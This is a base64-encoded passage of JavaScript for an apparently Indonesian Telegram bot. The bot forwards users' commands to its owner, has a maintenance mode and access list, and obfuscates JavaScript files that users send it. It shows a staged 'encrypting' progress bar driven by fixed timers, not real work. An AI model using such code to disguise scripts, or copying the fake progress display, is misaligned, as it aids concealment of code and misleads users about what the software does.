CAgICAgJHtsbn1gCiAgfSkuam9pbigiXG4iKQp9CgpmdW5jdGlvbiBjbGVhbkNvZGUoY29kZSkgewogIGNvbnN0IGxpbmVzICA9IGNvZGUuc3BsaXQoIlxuIikKICBsZXQgICBpbmRlbnQgPSAwCiAgY29uc3QgU1RFUCAgID0gMgogIGNvbnN0IG91dCAgICA9IFtdCgogIGZvciAoY29uc3QgcmF3IG9mIGxpbmVzKSB7CiAgICBjb25zdCBjb250ZW50ID0gcmF3LnRyaW1FbmQoKS50cmltU3RhcnQoKQogICAgaWYgKCFjb250ZW50KSB7IG91dC5wdXNoKCIiKTsgY29udGludWUgfQoKICAgIGlmICgvXlt9XF0pXS8udGVzdChjb250ZW50KSkgaW5kZW50ID0gTWF0aC5tYXgoMCwgaW5kZW50IC0gU1RFUCkKICAgIG91dC5wdXNoKCIgIi5yZXBlYXQoaW5kZW50KSArIGNvbnRlbnQpCgogICAgY29uc3Qgc3RyaXBwZWQgPSBjb250ZW50LnJlcGxhY2UoL1wvXC8uKiQvLCAiIikucmVwbGFjZSgvIig/OlteIlxcXXxcXC4pKiJ8Jyg/OlteJ1xcXXxcXC4pKid8YCg/OlteYFxcXXxcXC4pKmAvZywgIiIpLnRyaW1FbmQoKQogICAgY29uc3Qgb3AgPSAoc3RyaXBwZWQubWF0Y2goL1t7WyhdL2cpIHx8IFtdKS5sZW5ndGgKICAgIGNvbnN0IGNsID0gKHN0cmlwcGVkLm1hdGNoKC9bfVxdKV0vZykgfHwgW10pLmxlbmd0aAogICAgaWYgKG9wID4gY2wpIGluZGVudCArPSBTVEVQCiAgfQoKICByZXR1cm4gb3V0LmpvaW4oIlxuIikucmVwbGFjZSgvXG57Myx9L2csICJcblxuIikudHJpbSgpCn0KCmZ1bmN0aW9uIHRyeUF1dG9GaXgoY29kZSkgewpsZXQgZml4ZWQgICAgPSBjb2RlCiAgbGV0IGZpeE5vdGVzID0gW10KCiAgLy8gUGFzcyAxIOKAlCBhd2FpdCBkaSBsdWFyIGFzeW5jCiAgaWYgKC9cYmF3YWl0XGIvLnRlc3QoZml4ZWQpICYmICEvYXN5bmNccyooZnVuY3Rpb258XCgpLy50ZXN0KGZpeGVkKSkgewogICAgZml4ZWQgPSBgYXN5bmMgZnVuY3Rpb24gX2F1dG9XcmFwcGVyKCkge1xuJHtmaXhlZH1cbn1cbl9hdXRvV3JhcHBlcigpLmNhdGNoKGNvbnNvbGUuZXJyb3IpYAogICAgZml4Tm90ZXMucHVzaCgiTWVtYnVuZ2t1cyBkYWxhbSBhc3luYyBmdW5jdGlvbiAoYXdhaXQgZGkgbHVhciBhc3luYykiKQogIH0KICBsZXQgciA9IGFuYWx5c2VDb2RlKGZpeGVkKQogIGlmICghci5oYXNFcnJvcikgcmV0dXJuIHsgZml4ZWQsIGZpeE5vdGVzLCByZXN1bHQ6IHIgfQoKICAvLyBQYXNzIDIg4oCUIG1pc3Npbmcgc2VtaWNvbG9ucwogIGNvbnN0IHBhc3MyID0gZml4ZWQuc3BsaXQoIlxuIikubWFwKGxuID0+IHsKICAgIGNvbnN0IHRyID0gbG4udHJpbUVuZCgpCiAgICBpZiAoCiAgICAgIC9eKGNvbnN0fGxldHx2YXJ8cmV0dXJufHRocm93fGJyZWFrfGNvbnRpbnVlKVxiLy50ZXN0KHRyLnRyaW0oKSkgJiYKICAgICAgIXRyLmVuZHNXaXRoKCI7IikgJiYgIXRyLmVuZHNXaXRoKCJ7IikgJiYgIXRyLmVuZHNXaXRoKCJ9IikgJiYKICAgICAgIXRyLmVuZHNXaXRoKCIsIikgJiYgIXRyLnN0YXJ0c1dpdGgoIi8vIikgJiYgIXRyLnN0YXJ0c1dpdGgoIioiKQogICAgKSByZXR1cm4gdHIgKyAiOyIKICAgIHJldHVybiBsbgogIH0pLmpvaW4oIlxuIikKICByID0gYW5hbHlzZUNvZGUocGFzczIpCiAgaWYgKCFyLmhhc0Vycm9yKSB7IGZpeGVkID0gcGFzczI7IGZpeE5vdGVzLnB1c2goIk1lbmFtYmFoa2FuIHNlbWljb2xvbiB5YW5nIGhpbGFuZyIpOyByZXR1cm4geyBmaXhlZCwgZml4Tm90ZXMsIHJlc3VsdDogciB9IH0KCiAgLy8gUGFzcyAzIOKAlCB0dXR1cCBrdXJ1bmcga3VyYXdhbAogIGNvbnN0IG9wZW5zMyAgPSAoZml4ZWQubWF0Y2goL1x7L2cpIHx8IFtdKS5sZW5ndGgKICBjb25zdCBjbG9zZXMzID0gKGZpeGVkLm1hdGNoKC9cfS9nKSB8fCBbXSkubGVuZ3RoCiAgaWYgKG9wZW5zMyA+IGNsb3NlczMpIHsKICAgIGZpeGVkICs9ICJcbiIgKyAifSIucmVwZWF0KG9wZW5zMyAtIGNsb3NlczMpCiAgICBmaXhOb3Rlcy5wdXNoKGBNZW5hbWJhaGthbiAke29wZW5zMyAtIGNsb3NlczN9IGt1cnVuZyBrdXJhd2FsIHBlbnV0dXBgKQogICAgciA9IGFuYWx5c2VDb2RlKGZpeGVkKQogICAgaWYgKCFyLmhhc0Vycm9yKSByZXR1cm4geyBmaXhlZCwgZml4Tm90ZXMsIHJlc3VsdDogciB9CiAgfQoKICAvLyBQYXNzIDQg4oCUIHR1dHVwIHRhbmRhIGt1cnVuZyBiaWFzYQogIGNvbnN0IG9wZW5QICA9IChmaXhlZC5tYXRjaCgvXCgvZykgfHwgW10pLmxlbmd0aAogIGNvbnN0IGNsb3NlUCA9IChmaXhlZC5tYXRjaCgvXCkvZykgfHwgW10pLmxlbmd0aAogIGlmIChvcGVuUCA+IGNsb3NlUCkgewogICAgZml4ZWQgKz0gIikiLnJlcGVhdChvcGVuUCAtIGNsb3NlUCkKICAgIGZpeE5vdGVzLnB1c2goYE1lbnV0dXAgJHtvcGVuUCAtIGNsb3NlUH0gdGFuZGEga3VydW5nYCkKICAgIHIgPSBhbmFseXNlQ29kZShmaXhlZCkKICAgIGlmICghci5oYXNFcnJvcikgcmV0dXJuIHsgZml4ZWQsIGZpeE5vdGVzLCByZXN1bHQ6IHIgfQogIH0KCiAgLy8gUGFzcyA1IOKAlCB0dXR1cCBrdXJ1bmcgc2lrdQogIGNvbnN0IG9wZW5CICA9IChmaXhlZC5tYXRjaCgvXFsvZykgfHwgW10pLmxlbmd0aAogIGNvbnN0IGNsb3NlQiA9IChmaXhlZC5tYXRjaCgvXF0vZykgfHwgW10pLmxlbmd0aAogIGlmIChvcGVuQiA+IGNsb3NlQikgewogICAgZml4ZWQgKz0gIl0iLnJlcGVhdChvcGVuQiAtIGNsb3NlQikKICAgIGZpeE5vdGVzLnB1c2goYE1lbnV0dXAgJHtvcGVuQiAtIGNsb3NlQn0ga3VydW5nIHNpa3VgKQogICAgciA9IGFuYWx5c2VDb2RlKGZpeGVkKQogICAgaWYgKCFyLmhhc0Vycm9yKSByZXR1cm4geyBmaXhlZCwgZml4Tm90ZXMsIHJlc3VsdDogciB9CiAgfQoKICAvLyBQYXNzIDYg4oCUIGhhcHVzIGJhcmlzIGVycm9yIGRhbiBjb2JhIGxhZ2kKICBpZiAoci5lcnJvckxpbmUpIHsKICAgIGNvbnN0IGxpbmVzNiAgPSBmaXhlZC5zcGxpdCgiXG4iKQogICAgY29uc3QgZXJySWR4ICA9IHIuZXJyb3JMaW5lIC0gMQogICAgY29uc3QgcmVtb3ZlZCA9IGxpbmVzNi5zcGxpY2UoZXJySWR4LCAxKVswXQogICAgY29uc3QgYWZ0ZXI2ICA9IGxpbmVzNi5qb2luKCJcbiIpCiAgICBjb25zdCByNiAgICAgID0gYW5hbHlzZUNvZGUoYWZ0ZXI2KQogICAgaWYgKCFyNi5oYXNFcnJvcikgewogICAgICBmaXhlZCA9IGFmdGVyNgogICAgICBmaXhOb3Rlcy5wdXNoKGBNZW5naGFwdXMgYmFyaXMgJHtyLmVycm9yTGluZX0gcGVueWViYWIgZXJyb3I6ICIke3JlbW92ZWQudHJpbSgpfSJgKQogICAgICByZXR1cm4geyBmaXhlZCwgZml4Tm90ZXMsIHJlc3VsdDogcjYgfQogICAgfQogIH0KCiAgcmV0dXJuIHsgZml4ZWQsIGZpeE5vdGVzLCByZXN1bHQ6IHIgfQp9Cgpjb25zdCBib3QgPSBuZXcgVGVsZWdyYWYoY29uZmlnLkJPVF9UT0tFTik7Cgpib3QudGVsZWdyYW0uc2V0TXlDb21tYW5kcyhbCiAgICB7CiAgICAgICAgY29tbWFuZDogJ3N0YXJ0JywKICAgICAgICBkZXNjcmlwdGlvbjogJ011bGFpIGJvdCcKICAgIH0sCiAgICB7CiAgICAgICAgY29tbWFuZDogJ2FpJywKICAgICAgICBkZXNjcmlwdGlvbjogJ0NoYXQgQWknCiAgICB9LAogICAgewogICAgICAgIGNvbW1hbmQ6ICdjaGF0b3duZXInLAogICAgICAgIGRlc2NyaXB0aW9uOiAnTWVtYmVyaSBwZXNhbiBrZSBvd25lcicKICAgIH0KXSkKLnRoZW4oKCkgPT4gewogICAgY29uc29sZS5sb2coJ1N1Y2Nlc3MgcmVnaXN0ZXIgY21kJykKfSkKLmNhdGNoKGNvbnNvbGUuZXJyb3IpCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBMT0cgQUtUSVZJVEFTIFVTRVIgT05MWQovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpib3QudXNlKGFzeW5jIChjdHgsIG5leHQpID0+IHsKCiAgICAvLyBoYW55YSBtZXNzYWdlIHRleHQKICAgIGlmICghY3R4Lm1lc3NhZ2U/LnRleHQpIHsKICAgICAgICByZXR1cm4gbmV4dCgpCiAgICB9CgogICAgY29uc3QgdGV4dCA9CiAgICAgICAgY3R4Lm1lc3NhZ2UudGV4dAoKICAgIC8vIGhhbnlhIGNvbW1hbmQKICAgIGlmICghdGV4dC5zdGFydHNXaXRoKCIvIikpIHsKICAgICAgICByZXR1cm4gbmV4dCgpCiAgICB9CgogICAgY29uc3QgdXNlciA9CiAgICAgICAgY3R4LmZyb20KCiAgICBjb25zdCB1c2VySWQgPQogICAgICAgIE51bWJlcih1c2VyLmlkKQoKICAgIC8vIHNraXAgb3duZXIKICAgIGlmICh1c2VySWQgPT09IGNvbmZpZy5PV05FUl9JRCkgewogICAgICAgIHJldHVybiBuZXh0KCkKICAgIH0KCiAgICAvLyB3YWt0dQogICAgY29uc3Qgd2FrdHUgPQogICAgICAgIG5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoCiAgICAgICAgICAgICJpZC1JRCIKICAgICAgICApCgogICAgLy8gYW1iaWwgY21kCiAgICBjb25zdCBjbWQgPQogICAgICAgIHRleHQuc3BsaXQoIiAiKVswXQoKICAgIC8vIGFtYmlsIGFyZ3MKICAgIGNvbnN0IGFyZ3MgPQogICAgICAgIHRleHQuc3BsaXQoIiAiKQogICAgICAgIC5zbGljZSgxKQogICAgICAgIC5qb2luKCIgIikgfHwgIi0iCgogICAgLy8gdXNlcm5hbWUKICAgIGNvbnN0IHVzZXJuYW1lID0KICAgICAgICB1c2VyLnVzZXJuYW1lCiAgICAgICAgPyAiQCIgKyB1c2VyLnVzZXJuYW1lCiAgICAgICAgOiAiVGlkYWsgYWRhIgoKICAgIC8vIG1lbnRpb24KICAgIGNvbnN0IG1lbnRpb24gPQpgJHtjdHguZnJvbS5maXJzdF9uYW1lfWAKCiAgICAvLyBraXJpbSBsb2cga2Ugb3duZXIKICAgIGF3YWl0IGJvdC50ZWxlZ3JhbS5zZW5kTWVzc2FnZSgKICAgICAgICBjb25maWcuT1dORVJfSUQsCmBcYFxgXGAK4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIOCzi+GDpiDwn4y6IOGDpuCziyDilZDilZDilZDilZDilZDilZDilZDilZcKICAgICBBa3RpZml0YXMtVXNlci1UZXJkZXRla3NpCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkCDgs4vhg6Yg8J+MuiDhg6bgs4sg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCvCfkaQgVVNFUiA6ICR7bWVudGlvbn0K8J+RpSBVU0VSTkFNRSA6ICR7dXNlcm5hbWV9CvCfhpQgSUQgOiAke3VzZXJJZH0K4pqhIENPTU1BTkQgOiAke2NtZH0K8J+VkiBXQUtUVTxiPiA6ICR7d2FrdHV9XGBcYFxgCmAsCiAgICAgICAgewogICAgICAgICAgICBwYXJzZV9tb2RlOiAiTWFya2Rvd24iLAogICAgICAgICAgICBkaXNhYmxlX3dlYl9wYWdlX3ByZXZpZXc6IHRydWUKICAgICAgICB9CiAgICApLmNhdGNoKCgpID0+IHt9KQoKICAgIHJldHVybiBuZXh0KCkKCn0pCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBNQUlOVEVOQU5DRSBNSURETEVXQVJFCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmJvdC51c2UoYXN5bmMgKGN0eCwgbmV4dCkgPT4gewoKICAgIGNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKAogICAgICAgIGZzLnJlYWRGaWxlU3luYyhQQVRIX01BSU5URU5BTkNFLCAidXRmOCIpCiAgICApCgogICAgY29uc3QgbWFpbnRlbmFuY2UgPSBkYXRhLnN0YXR1cwogICAgY29uc3QgcmVhc29uID0gZGF0YS5yZWFzb24gfHwgIlRpZGFrIGFkYSBhbGFzYW4iCgogICAgY29uc3QgdXNlcklkID0gTnVtYmVyKGN0eC5mcm9tLmlkKQoKICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAvLyBPV05FUiBCWVBBU1MKICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICBpZiAodXNlcklkID09PSBjb25maWcuT1dORVJfSUQpIHsKICAgICAgICByZXR1cm4gbmV4dCgpCiAgICB9CgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIC8vIE1BSU5URU5BTkNFIE9GRgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIGlmICghbWFpbnRlbmFuY2UpIHsKICAgICAgICByZXR1cm4gbmV4dCgpCiAgICB9CgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIC8vIFVTRVIgJiBQUkVNSVVNIFRFUktFTkEKICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICByZXR1cm4gY3R4LnJlcGx5KAogICAgICAgIGBcYFxgXGAK4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4oCiwrDigKLimqDvuI/igKLCsOKAouKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkArimpnvuI8gQk9UIFNFREFORyBNQUlOVEVOQU5DRQoKVHVuZ2d1IGhpbmdnYSBtYWludGVuYW5jZSBzZWxlc2FpLgrwn5OdIGluZm9ybWF0aW9uIDogJHtyZWFzb259CuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkFxgXGBcYAoKYCwKICAgICAgICB7CiAgICAgICAgICAgIHBhcnNlX21vZGU6ICJNYXJrZG93biIKICAgICAgICB9CiAgICApCn0pCgovLy8vIHNpbXBhbiBtYXBwaW5nIHBlc2FuIG93bmVyIC0+IHVzZXIKY29uc3QgQURNSU5fUkVQTFlfREIgPSB7fQovLyA9PT09PT09PT09PT09PT09PT09PSBEQVRBQkFTRSBBS1NFUyA9PT09PT09PT09PT09PT09PT09PQpjb25zdCBBQ0NFU1NfRklMRSA9ICcuL2Frc2VzLmpzb24nOwoKZnVuY3Rpb24gbG9hZEFrc2VzKCkgewogICAgaWYgKCFmcy5leGlzdHNTeW5jKEFDQ0VTU19GSUxFKSkgewogICAgICAgIGZzLndyaXRlSnNvblN5bmMoQUNDRVNTX0ZJTEUsIHsgdXNlcnM6IHt9IH0pOwogICAgfQogICAgcmV0dXJuIGZzLnJlYWRKc29uU3luYyhBQ0NFU1NfRklMRSk7Cn0KCmZ1bmN0aW9uIHNhdmVBa3NlcyhkYXRhKSB7CiAgICBmcy53cml0ZUpzb25TeW5jKEFDQ0VTU19GSUxFLCBkYXRhLCB7IHNwYWNlczogMiB9KTsKfQoKZnVuY3Rpb24gaXNVc2VySGFzQWNjZXNzKHVzZXJJZCkgewogICAgY29uc3QgZGF0YSA9IGxvYWRBa3NlcygpOwogICAgcmV0dXJuIGRhdGEudXNlcnNbdXNlcklkXSA9PT0gdHJ1ZTsKfQoKZnVuY3Rpb24gc2V0VXNlckFjY2Vzcyh1c2VySWQsIGhhc0FjY2VzcykgewogICAgY29uc3QgZGF0YSA9IGxvYWRBa3NlcygpOwoKICAgIGlmIChoYXNBY2Nlc3MpIHsKICAgICAgICBkYXRhLnVzZXJzW3VzZXJJZF0gPSB0cnVlOwogICAgfSBlbHNlIHsKICAgICAgICBkZWxldGUgZGF0YS51c2Vyc1t1c2VySWRdOwogICAgfQoKICAgIHNhdmVBa3NlcyhkYXRhKTsKfQoKLy8gPT09PT09PT09PT09PT09PT09PT0gVEhVTUJOQUlMIExPS0FMID09PT09PT09PT09PT09PT09PT09CmFzeW5jIGZ1bmN0aW9uIGdldFRodW1ibmFpbEJ1ZmZlcigpIHsKICAgIHRyeSB7CiAgICAgICAgaWYgKGF3YWl0IGZzLnBhdGhFeGlzdHMoY29uZmlnLlRIVU1CTkFJTF9QQVRIKSkgcmV0dXJuIGF3YWl0IGZzLnJlYWRGaWxlKGNvbmZpZy5USFVNQk5BSUxfUEFUSCk7CiAgICAgICAgcmV0dXJuIG51bGw7CiAgICB9IGNhdGNoIChlcnIpIHsgcmV0dXJuIG51bGw7IH0KfQoKLy8gPT09PT09PT09PT09PT09PT09PT0gS0VZQk9BUkQgPT09PT09PT09PT09PT09PT09PT0KY29uc3Qgb3Blbk1lbnVLZXlib2FyZCA9IHsKICAgIGlubGluZV9rZXlib2FyZDogWwogICAgWwogICAgICB7IAogICAgICAgIHRleHQ6ICLwnZau8J2XkPCdl4fwnZa+8J2XiyIsIAogICAgICAgIHVybDogImh0dHBzOi8vdC5tZS9zYWJpbG9mZmljaWFsIiwKICAgICAgICBzdHlsZTogInN1Y2Nlc3MiIAogICAgICAgfSwKICAgICAgIHsKICAgICAgICB0ZXh0OiAi4paiIiwKICAgICAgICBjYWxsYmFja19kYXRhOiAib3duZXJfbWVudSIsCiAgICAgICAgc3R5bGU6ICJkYW5nZXIiCiAgICAgICB9LAogICAgICB7IAogICAgICAgIHRleHQ6ICLwnZat8J2WvvCdl5HwnZeNIiwgCiAgICAgICAgY2FsbGJhY2tfZGF0YTogInRvb2xzX21lbnUiLCAKICAgICAgICBzdHlsZTogInByaW1hcnkiIAogICAgICAgfSAKICAgIF0KICBdCn07Cgpjb25zdCBPd25LYiA9IHsKICAgIGlubGluZV9rZXlib2FyZDogWwogICAgICAgIFsKICAgICAgICAgeyAKICAgICAgICAgIHRleHQ6ICLwnZah8J2WuvCdlrzwnZeEIiwgCiAgICAgICAgICBjYWxsYmFja19kYXRhOiAibWFpbl9tZW51IiwKICAgICAgICAgIHN0eWxlOiAicHJpbWFyeSIKICAgICAgICAgfSwKICAgICAgICAgeyAKICAgICAgICAgIHRleHQ6ICLwnZat8J2Wvnh0IiwgCiAgICAgICAgICBjYWxsYmFja19kYXRhOiAidG9vbHNfbWVudSIsCiAgICAgICAgICBzdHlsZTogImRhbmdlciIKICAgICAgICAgfQogICAgICAgXQogICAgXQp9OwoKY29uc3QgVG9vbHNLZXlib2FyZCA9IHsKICAgIGlubGluZV9rZXlib2FyZDogWwogICAgICAgIFsKICAgICAgICAgeyAKICAgICAgICAgIHRleHQ6ICLwnZah8J2WuvCdlrzwnZeEIiwgCiAgICAgICAgICBjYWxsYmFja19kYXRhOiAibWFpbl9tZW51IiwKICAgICAgICAgIHN0eWxlOiAicHJpbWFyeSIKICAgICAgICAgfSwKICAgICAgICAgeyAKICAgICAgICAgIHRleHQ6ICLwnZat8J2Wvnh0IiwgCiAgICAgICAgICBjYWxsYmFja19kYXRhOiAiZW5jX21lbnVfdjEiLAogICAgICAgICAgc3R5bGU6ICJkYW5nZXIiCiAgICAgICAgIH0KICAgICAgIF0KICAgIF0KfTsKCmNvbnN0IEVuY1YxS2V5Ym9hcmQgPSB7CiAgICBpbmxpbmVfa2V5Ym9hcmQ6IFsKICAgICAgICBbCiAgICAgICAgIHsgCiAgICAgICAgICB0ZXh0OiAi8J2WofCdlrrwnZa88J2XhCIsIAogICAgICAgICAgY2FsbGJhY2tfZGF0YTogInRvb2xzX21lbnUiLAogICAgICAgICAgc3R5bGU6ICJzdWNjZXNzIgogICAgICAgICB9LAogICAgICAgICB7IAogICAgICAgICAgdGV4dDogIvCdlq3wnZa+8J2XkfCdl40iLCAKICAgICAgICAgIGNhbGxiYWNrX2RhdGE6ICJlbmNfbWVudV92MiIsCiAgICAgICAgICBzdHlsZTogInByaW1hcnkiCiAgICAgICAgIH0KICAgICAgIF0KICAgIF0KfTsKCmNvbnN0IEVuY1YyS2V5Ym9hcmQgPSB7CiAgICBpbmxpbmVfa2V5Ym9hcmQ6IFsKICAgICAgICBbCiAgICAgICAgIHsgCiAgICAgICAgICB0ZXh0OiAi8J2WofCdlrrwnZa88J2XhCIsIAogICAgICAgICAgY2FsbGJhY2tfZGF0YTogImVuY19tZW51X3YxIiwKICAgICAgICAgIHN0eWxlOiAiZGFuZ2VyIgogICAgICAgICB9LAogICAgICAgICB7IAogICAgICAgICAgdGV4dDogIvCdlq3wnZa+8J2XkfCdl40iLCAKICAgICAgICAgIGNhbGxiYWNrX2RhdGE6ICJtYWluX21lbnUiLAogICAgICAgICAgc3R5bGU6ICJzdWNjZXNzIiAKICAgICAgICAgfQogICAgICAgXQogICAgXQp9OwoKLy8gd2lrIHdvayB0aGUgdG9sawphc3luYyBmdW5jdGlvbiBzZW5kRW5jcnlwdFByb2dyZXNzKGN0eCwgd2FpdE1zZywgbW9kZU5hbWUpIHsKICAgIGNvbnN0IHN0ZXBzID0gWwogICAgICAgIHsgcGVyY2VudDogMjAsIHRleHQ6IGDimpnvuI8gTWVuZ3VuZHVoIGZpbGUgKG1vZGU6ICR7bW9kZU5hbWV9KWAsIGRlbGF5OiA2MDAgfSwKICAgICAgICB7IHBlcmNlbnQ6IDQwLCB0ZXh0OiBg4pqZ77iPIFBST1NFUyBFTkNSWVBUICgke21vZGVOYW1lfSlgLCBkZWxheTogODAwIH0sCiAgICAgICAgeyBwZXJjZW50OiA3MCwgdGV4dDogYOKame+4jyBFbmNyeXB0aW5nIGRlbmdhbiBhbGdvcml0bWEgJHttb2RlTmFtZX0uLi5gLCBkZWxheTogODAwIH0sCiAgICAgICAgeyBwZXJjZW50OiAxMDAsIHRleHQ6IGDinIUgRmlsZSBiZXJoYXNpbCBkaWVuY3J5cHQhICgke21vZGVOYW1lfSlgLCBkZWxheTogNTAwIH0KICAgIF07CiAgICBmb3IgKGNvbnN0IHN0ZXAgb2Ygc3RlcHMpIHsKICAgICAgICBjb25zdCBiYXJMZW5ndGggPSAyMDsKICAgICAgICBjb25zdCBmaWxsZWQgPSBNYXRoLnJvdW5kKChzdGVwLnBlcmNlbnQgLyAxMDApICogYmFyTGVuZ3RoKTsKICAgICAgICBjb25zdCBiYXIgPSAn4paIJy5yZXBlYXQoZmlsbGVkKSArICfilpInLnJlcGVhdChiYXJMZW5ndGggLSBmaWxsZWQpOwogICAgICAgIGF3YWl0IGN0eC50ZWxlZ3JhbS5lZGl0TWVzc2FnZVRleHQod2FpdE1zZy5jaGF0LmlkLCB3YWl0TXNnLm1lc3NhZ2VfaWQsIHVuZGVmaW5lZCwgYDxwcmU+JHtiYXJ9ICR7c3RlcC5wZXJjZW50fSVcbiR7c3RlcC50ZXh0fTwvcHJlPiBQUk9TRVMgRU5DUllQVGAsIHsgcGFyc2VfbW9kZTogJ0hUTUwnIH0pOwogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCBzdGVwLmRlbGF5KSk7CiAgICB9Cn0KCi8vIGthY3VuZyBwcmltZQphc3luYyBmdW5jdGlvbiBwcm9jZXNzT2JmdXNjYXRlKGN0eCwgbW9kZSkgewogICAgLy8gVmFsaWRhc2kgbW9kZQogICAgaWYgKCFtb2RlIHx8IHR5cGVvZiBtb2RlICE9PSAnc3RyaW5nJykgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ01vZGUgdGlkYWsgdmFsaWQ6JywgbW9kZSk7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgn4p2MIFRlcmphZGkga2VzYWxhaGFuOiBtb2RlIG9iZnVzY2F0aW9uIHRpZGFrIHZhbGlkLicpOwogICAgfQogICAgCiAgICBjb25zdCB1c2VySWQgPSBjdHguZnJvbS5pZDsKICAgIGlmICghaXNVc2VySGFzQWNjZXNzKHVzZXJJZCkgJiYgdXNlcklkICE9PSBjb25maWcuT1dORVJfSUQpIHsKICAgICAgICByZXR1cm4gY3R4LnJlcGx5KCfinYwgQWtzZXMgZGl0b2xhay4gU2lsYWthbiBqb2luIGNoYW5uZWwgdGVybGViaWggZGFodWx1LicpOwogICAgfQogICAgaWYgKCFjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlKSB7CiAgICAgICAgcmV0dXJuIGN0eC5yZXBseSgn4p2MICpDYXJhOiogUmVwbHkgZmlsZSAuanMgYXRhdSB0ZWtzIEpTLCBsYWx1IGtldGlrIGNvbW1hbmQuXG5Db250b2g6IGAvamFwYW5gJywgeyBwYXJzZV9tb2RlOiAnTWFya2Rvd24nIH0pOwogICAgfQogICAgCiAgICBsZXQgY29kZSA9ICcnOwogICAgbGV0IG9yaWdpbmFsQmFzZU5hbWUgPSAnc2NyaXB0JzsKICAgIGNvbnN0IHJlcGxpZWQgPSBjdHgubWVzc2FnZS5yZXBseV90b19tZXNzYWdlOwogICAgaWYgKHJlcGxpZWQudGV4dCkgewogICAgICAgIGNvZGUgPSByZXBsaWVkLnRleHQ7CiAgICAgICAgb3JpZ2luYWxCYXNlTmFtZSA9ICdjb2RlJzsKICAgIH0gZWxzZSBpZiAocmVwbGllZC5kb2N1bWVudCkgewogICAgICAgIGNvbnN0IGRvYyA9IHJlcGxpZWQuZG9jdW1lbnQ7CiAgICAgICAgaWYgKGRvYy5taW1lX3R5cGUgIT09ICd0ZXh0L2phdmFzY3JpcHQnICYmICFkb2MuZmlsZV9uYW1lLmVuZHNXaXRoKCcuanMnKSkgewogICAgICAgICAgICByZXR1cm4gY3R4LnJlcGx5KCfinYwgRmlsZSBoYXJ1cyAuanMnKTsKICAgICAgICB9CiAgICAgICAgb3JpZ2luYWxCYXNlTmFtZSA9IGRvYy5maWxlX25hbWUucmVwbGFjZSgvXC5bXi8uXSskLywgJycpOwogICAgICAgIGNvbnN0IGZpbGVMaW5rID0gYXdhaXQgY3R4LnRlbGVncmFtLmdldEZpbGVMaW5rKGRvYy5maWxlX2lkKTsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGF4aW9zLmdldChmaWxlTGluay5ocmVmLCB7IHJlc3BvbnNlVHlwZTogJ3RleHQnIH0pOwogICAgICAgIGNvZGUgPSByZXNwb25zZS5kYXRhOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gY3R4LnJlcGx5KCfinYwgUmVwbHkga2UgdGVrcyBhdGF1IGZpbGUgLmpzJyk7CiAgICB9CiAgICBpZiAoIWNvZGUudHJpbSgpKSByZXR1cm4gY3R4LnJlcGx5KCfinYwgS29kZSBrb3NvbmcuJyk7CiAgICAKICAgIGNvbnN0IGNsZWFuTW9kZSA9IFN0cmluZyhtb2RlKS50b0xvd2VyQ2FzZSgpLnJlcGxhY2UoLyAvZywgJ18nKTsKICAgIGNvbnN0IG91dHB1dEZpbGVuYW1lID0gYCR7Y2xlYW5Nb2RlfS1lbmNyeXB0LSR7b3JpZ2luYWxCYXNlTmFtZX0uanNgOwogICAgCiAgICBjb25zdCB3YWl0TXNnID0gYXdhaXQgY3R4LnJlcGx5KGA8cHJlPuKWiOKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkuKWkiAxMCVcbk1lbXVsYWkgb2JmdXNjYXRpb246ICR7bW9kZX08L3ByZT5gLCB7IHBhcnNlX21vZGU6ICdIVE1MJyB9KTsKICAgIHRyeSB7CiAgICAgICAgYXdhaXQgc2VuZEVuY3J5cHRQcm9ncmVzcyhjdHgsIHdhaXRNc2csIG1vZGUpOwogICAgICAgIGxldCBmaW5hbENvZGUgPSBjb2RlCiAgICAgICAgY29uc3Qgb2JmdXNjYXRlZCA9IG9wdGlvbnMoZmluYWxDb2RlKTsKICAgICAgICBjb25zdCBidWZmZXIgPSBCdWZmZXIuZnJvbShvYmZ1c2NhdGVkLCAndXRmOCcpOwogICAgICAgIGF3YWl0IGN0eC5yZXBseVdpdGhEb2N1bWVudCh7IHNvdXJjZTogYnVmZmVyLCBmaWxlbmFtZTogb3V0cHV0RmlsZW5hbWUgfSwgeyBjYXB0aW9uOiBg4pyFIE1vZGU6ICR7bW9kZX1cbkZpbGUgYmVyaGFzaWwgZGktZW5jcnlwdCFgIH0pOwogICAgICAgIGF3YWl0IGN0eC5kZWxldGVNZXNzYWdlKHdhaXRNc2cubWVzc2FnZV9pZCkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgYXdhaXQgY3R4LnRlbGVncmFtLmVkaXRNZXNzYWdlVGV4dCh3YWl0TXNnLmNoYXQuaWQsIHdhaXRNc2cubWVzc2FnZV9pZCwgdW5kZWZpbmVkLCBg4p2M